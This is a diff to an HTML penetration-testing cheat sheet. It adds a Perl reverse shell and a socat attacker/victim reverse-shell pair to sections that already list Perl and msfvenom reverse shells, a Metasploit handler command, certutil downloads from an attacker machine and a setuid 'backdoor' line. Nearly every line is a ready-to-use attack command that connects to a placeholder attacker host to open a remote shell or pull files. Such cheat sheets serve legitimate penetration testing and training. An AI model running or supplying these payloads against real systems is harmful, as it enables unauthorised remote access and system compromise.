@@ -512,6 +512,7 @@ msfvenom -p cmd/unix/reverse_bash LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER'
 <pre style="background-color:black;color:white;">
 perl -e 'use Socket;$i="[ATTACKER's_IP_ADDRESS]";$p=[ATTACKER's_PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'	(reverse shell)
 msfvenom -p cmd/unix/reverse_perl LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f raw > shell.pl	(reverse shell using msfvenom)
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 </pre>
 <p><font size="3.5" color="black">Python</font></p>
 <pre style="background-color:black;color:white;">
@@ -563,6 +564,12 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] PORT=[ATTACKER's_PORT] -f macho > shell.macho	(reverse shell using msfvenom)
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f [LANGUAGE]		(reverse shell using msfvenom - shellcode)
 </pre>
+<p><font size="3.5" color="black">Socat</font></p>
+<pre style="background-color:black;color:white;">
+#if there's no socat on the system you can use the binary here - https://github.com/andrew-d/static-binaries
+socat file:`tty`,raw,echo=0 tcp-listen:443	#attacker
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[LHOST_IP]:443 #victim
+</pre>
 <p><font size="3.5" color="black">MSF stuff</font></p>
 <pre style="background-color:black;color:white;">
 msfconsole -x "use exploit/multi/handler;set LHOST [ATTACKER's_IP_ADDRESS];set LPORT [ATTACKER's_PORT];set PAYLOAD [PAYLOAD];run"
@@ -609,9 +616,11 @@ os.execute('/bin/sh')
 </pre>
 <hr>
 <p><h3>File Transfer</h3></p>
-<p><font size="3.5" color="black">Linux --> Windows:</font></p>
 <pre style="background-color:black;color:white;">
-certutil -urlcache -split -f http://[ATTACKERS_MACHINE]/[FILE_TO_TRANSFER] C:\\users\public\[FILE_TO_TRANSFER]	#certutil method
+certutil -urlcache -split -f http://[ATTACKERS_MACHINE]/[FILE_TO_TRANSFER] C:\\users\public\[FILE_TO_TRANSFER]	#certutil method (Linux --> Windows)
+python3 -m http.server [PORT]	#Simple HTTP request handler - very basic web server serving files relative to the current directory - In Arch
+python -m SimpleHTTPServer [PORT]	#In Kali
+php -S 127.0.0.1:8080	#HTTP request handler in php
 </pre>
 <p><font size="3.5" color="black">- https://blog.ropnop.com/transferring-files-from-kali-to-windows/</font></p>
 <p><font size="3.5" color="black">- SecureCopy (scp) - http://www.hypexr.org/linux_scp_help.php</font></p>
@@ -1122,8 +1131,6 @@ chmod u+s /bin/nano    # installs the backdoor
 <hr>
 <p><h3>More</h3></p>
 <pre style="background-color:black;color:white;">
-python3 -m http.server [PORT]	(Simple HTTP request handler - very basic web server serving files relative to the current directory - In Arch)
-python -m SimpleHTTPServer [PORT] (In Kali)
 sort [WORDLIST_PATH] | uniq          (Outputs unique words in a wordlist that is found)
 sort [WORDLIST_PATH] | uniq | wc -l  (sorts number of unique words in a wordlist that is found)
 ip -4 addr show scope global    /*Determine interfaces ip address + prefix*/
